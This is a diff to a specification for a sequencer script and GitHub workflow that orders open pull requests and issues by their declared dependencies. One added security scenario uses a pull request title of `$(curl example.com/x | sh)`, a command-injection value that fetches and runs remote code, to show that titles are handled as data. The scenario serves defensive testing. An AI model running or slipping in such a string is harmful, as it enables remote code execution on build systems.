@@ -31,12 +31,13 @@ These terms hold throughout this spec:
   alike, with their reasons, and a list of
   edges not counted.
 - **A change** is an OpenSpec change: a directory under `openspec/changes/`
-  other than `archive/`. **An open change** is one on its repository's default branch or
-  in an open pull request's diff against its base. A change **belongs to** the
+  other than `archive/`. **An open change** is one on its repository's default branch, or one
+  in an open pull request's diff against its base, if the pull request's
+  head still holds it. A change **belongs to** the
   earliest-opened open pull request whose diff against its base adds or
   changes a file in the change's directory that its head still holds,
   looking first only at pull requests writers opened, and at all of them
-  when none of those does, and
+  when no writer's pull request does, and
   the order places the
   change where it places that pull request.
 - **A change's requirement** is a requirement that the change's delta adds,
@@ -81,7 +82,10 @@ These terms hold throughout this spec:
 - **The model step** applies the one rule that needs a model: a change
   whose code will call another change's code is built after it. **A pair
   of changes** is two changes, each belonging to a different open pull
-  request a writer opened, and no other change is in any pair, and **a code edge** is an edge the model step found.
+  request a writer opened, so a change on the default branch, or one
+  belonging to a pull request no writer opened, is in no pair; and **a code edge** is an edge the model step found.
+- **`order`** is the script's command that prints the order, and
+  **`publish`** the one that edits bodies.
 - **A Sequencer Igor** is an Igor in the Sequencer role; **an Igor's work
   triage** is the step where an Igor chooses which items to take.
 
@@ -90,7 +94,7 @@ These terms hold throughout this spec:
 ### Requirement: The order holds every open pull request and the issues linked to the work
 
 The order SHALL hold each open pull request and, of the open issues, only
-those that an explicit link connects to another item through an edge that
+those that an explicit link connects to another open issue or pull request through an edge that
 counts (see *Only edges set by writers count*), and those that an open
 pull request a writer opened is tied to; the order's issue is never an
 item. Only writers' links and ties bring issues in, since otherwise anyone
@@ -371,9 +375,9 @@ requirement with the archiving change's whole copy.
 
 An item SHALL come after each item that a GitHub "blocked by" relation or a
 `Depends on` line in its body says it waits on, and a change's pull request
-after the pull request each of its `proposal.md`'s `Builds on:` lines
-names in a repository the order holds; a number naming no pull request
-gives no edge.
+after the pull request each `Builds on:` line in its `proposal.md` names;
+a `Builds on:` line naming an issue, or a repository the order does not
+hold, gives no edge.
 
 #### Scenario: A Depends on line orders two issues
 
@@ -401,17 +405,22 @@ gives no edge.
 ### Requirement: A Depends on line names items by number, with or without their repository
 
 A `Depends on` line SHALL be a body line, outside code fences, starting
-`Depends on ` and followed by `#<number>` or `<owner>/<repo>#<number>`
-references separated by commas or `and`, where `<owner>` holds only
-letters, digits and `-`, and `<repo>` only those, `.` and `_`; other text
-is no reference, here or in a `Builds on:` line's parentheses. A
-reference that names this repository in full, in upper or lower case, SHALL be read as its
-`#<number>`.
+`Depends on `, ignoring case, then `#<number>` or `<owner>/<repo>#<number>`
+references separated by commas or `and`; `<owner>` holds only letters,
+digits and `-`, and `<repo>` also `.` and `_`. The references SHALL end
+at the first other text, which is ignored. A reference naming this
+repository in full, ignoring case, SHALL read as its `#<number>`. A
+`Builds on:` line's parentheses SHALL follow the same rules.
 
 #### Scenario: A reference naming this repository in full orders like a short one
 
 - **WHEN** #12's body, in the repository adamstallard/shared-skills, holds
   the line `Depends on adamstallard/shared-skills#9`
+- **THEN** #12 comes after #9, with the reason `after #9: depends on it`
+
+#### Scenario: Text after the references is ignored
+
+- **WHEN** #12's body holds the line `Depends on #9 (the schema)`
 - **THEN** #12 comes after #9, with the reason `after #9: depends on it`
 
 #### Scenario: A reference with a mention in it is no reference
@@ -507,8 +516,8 @@ once, onto the one merged before it.
 
 #### Scenario: Overlapping pull requests get a merge wait
 
-- **WHEN** #30 and #33 both change `src/claims.py`, and no edge connects
-  them
+- **WHEN** #30 and #33 both change `src/claims.py`, #30 was opened
+  earlier, and no edge connects them
 - **THEN** #33 stays after #30, where the order they were opened in placed it, and #33's
   block says `` merges after #30: both change `src/claims.py`; rebase once
   onto it ``
@@ -652,7 +661,7 @@ latest is the override.
 
 A change whose code will call code another open change adds SHALL come after
 that change, as the model step finds. To help it, the script SHALL print,
-for each pair of changes whose pull requests writers opened, the
+for each pair of changes, the
 backticked names that both changes'
 `tasks.md` files hold. The script SHALL take the model step's edges only
 with a reason each, and refuse the whole set when any edge has no reason.
@@ -809,24 +818,24 @@ SHALL go in a comment.
 
 ### Requirement: The script's text opens with a heading
 
-The line after each `<!-- sequencer:begin -->` marker SHALL be a heading:
-`## Order` in the order's issue, and `## Sequencer` in an item's block,
-because the inquisitor spec's *Only four kinds of document are decision
-documents* takes the text before an issue's first heading as the issue's
-decision block, so the script's text there would be read as a decision,
-and the order is no decision.
+The line after each `<!-- sequencer:begin -->` marker SHALL be a
+first-level heading: `# Order` in the order's issue, and `# Sequencer` in
+an item's block. The inquisitor spec's *Only four kinds of document are
+decision documents* reads an issue's text before its first heading, or a
+section headed "Decision", as its decision block, and the heading keeps
+the script's text out of both, since the order is no decision.
 
 #### Scenario: The order is never read as a decision
 
 - **WHEN** the script writes the order's issue body
-- **THEN** the line after `<!-- sequencer:begin -->` is `## Order`
+- **THEN** the line after `<!-- sequencer:begin -->` is `# Order`
 
 #### Scenario: A block in an issue with no heading is not read as a decision
 
 - **WHEN** #43 enters the order, and its body is one paragraph with no
   heading
 - **THEN** its new block's line after `<!-- sequencer:begin -->` is
-  `## Sequencer`
+  `# Sequencer`
 
 ### Requirement: Text from a pull request or the model is written inert
 
@@ -1024,12 +1033,12 @@ its head, it SHALL await that reviewer or team again.
 ### Requirement: Reviewers come from the repository's config, else from GitHub's requests, else CODEOWNERS
 
 A non-draft pull request SHALL await every login in the `reviewers` list
-of `.github/sequencer.json` on the default branch, other than its own
-author's. With
-no such list, it SHALL await each reviewer it has requested on GitHub,
-including one GitHub removed from its requests when they reviewed.
-Having never requested anyone, it SHALL await the owners CODEOWNERS gives its changed
-files. A team SHALL count as one reviewer.
+of `.github/sequencer.json` on the default branch, other than its
+author's. With no such list, it SHALL await each reviewer it requested on
+GitHub that no person has since removed, including one whose request
+GitHub cleared on their review (task 0.7 measures whether the two can be
+told apart). Awaiting no one that way, it SHALL await the owners
+CODEOWNERS gives its changed files. A team SHALL count as one reviewer.
 
 #### Scenario: A team is one reviewer
 
@@ -1106,9 +1115,10 @@ it with the newer template when given `--force`.
 ### Requirement: The workflow recomputes the order on GitHub events and once a day
 
 The workflow SHALL run the script when an issue is opened, edited, closed,
-reopened or commented on; when a pull request is opened, edited, marked
+reopened or commented on, a comment on a pull request included; when a
+pull request is opened, edited, marked
 ready for review, converted to draft, reviewed, reopened, closed without
-merging, or merged; when a push reaches an open
+merging, or merged; when a push reaches the default branch or an open
 pull request's branch; when a Sequencer Igor dispatches it; and once a
 day. All its runs SHALL share one
 concurrency group, so no two of them edit a body at once.
@@ -1119,6 +1129,12 @@ concurrency group, so no two of them edit a body at once.
 - **THEN** its pull request events other than reviews trigger through
   `pull_request_target`, reviews through `pull_request_review`, and none
   through `pull_request`
+
+#### Scenario: A commit to the default branch starts a run
+
+- **WHEN** a commit straight to the default branch adds `li` to the
+  `reviewers` list in `.github/sequencer.json`
+- **THEN** a run starts, and the order's issue names `li`'s next review
 
 #### Scenario: Two quick merges run one after the other
 
@@ -1157,7 +1173,7 @@ events, and each call is paid for with the repository's key.
 
 #### Scenario: A comment makes no API call
 
-- **WHEN** a pair of writers' changes is unchecked because the last call
+- **WHEN** a pair of changes is unchecked because the last call
   failed, and someone comments on an issue
 - **THEN** the run that comment triggers makes no API call, and the pair
   stays unchecked
@@ -1165,8 +1181,7 @@ events, and each call is paid for with the repository's key.
 ### Requirement: With an API key, the model step is one API call with no tools
 
 Where the repository chose its API key, `publish --model api` SHALL run the
-model step, only while some pair of changes, both from pull requests
-writers opened, is unchecked, since only such pairs' edges count, as one
+model step, only while some pair of changes is unchecked, as one
 Messages API call that offers no tools, sending those changes' files and
 taking from the reply only what it validates as an edges file. When that
 fails, the pairs SHALL stay unchecked, as *The order says plainly what it
@@ -1181,8 +1196,8 @@ did not check* says.
 
 #### Scenario: No unchecked pair makes no call
 
-- **WHEN** a writer's push triggers a run, and every pair of changes whose
-  pull requests writers opened is checked
+- **WHEN** a writer's push triggers a run, and every pair of changes is
+  checked
 - **THEN** the script makes no API call
 
 #### Scenario: A reply that does not parse checks nothing
@@ -1201,7 +1216,7 @@ did not check* says.
 
 Where the repository chose an Igor, `publish`, as the workflow runs it,
 SHALL keep the order's issue labelled `sequencer: check code` exactly while
-the order it publishes leaves unchecked a pair of changes whose pull requests writers opened.
+the order it publishes leaves unchecked a pair of changes.
 
 #### Scenario: An unchecked order is labelled for an Igor
 
@@ -1231,7 +1246,9 @@ file, and publish it with `publish --code-edges`.
 The workflow SHALL run only the script, from the shared-skills commit that
 `setup-ci` writes into the workflow file, and the OpenSpec CLI at the
 version that file pins, reading pull requests' files as
-data, and SHALL NOT check out or run code from a pull request's head.
+data, and SHALL NOT check out or run code from a pull request's head. It
+SHALL hand event fields and dispatch inputs to the script only through
+environment variables or files, never inside a command line.
 
 #### Scenario: A fork's pull request cannot run code with the token
 
@@ -1239,6 +1256,12 @@ data, and SHALL NOT check out or run code from a pull request's head.
   a script
 - **THEN** the run reads the pull request's change files as data and runs
   none of its code
+
+#### Scenario: A pull request's title is never run
+
+- **WHEN** a pull request's title is `$(curl example.com/x | sh)`
+- **THEN** the run hands the title to the script as data and runs nothing
+  from it
 
 ### Requirement: Data names an item by its repository and number
 
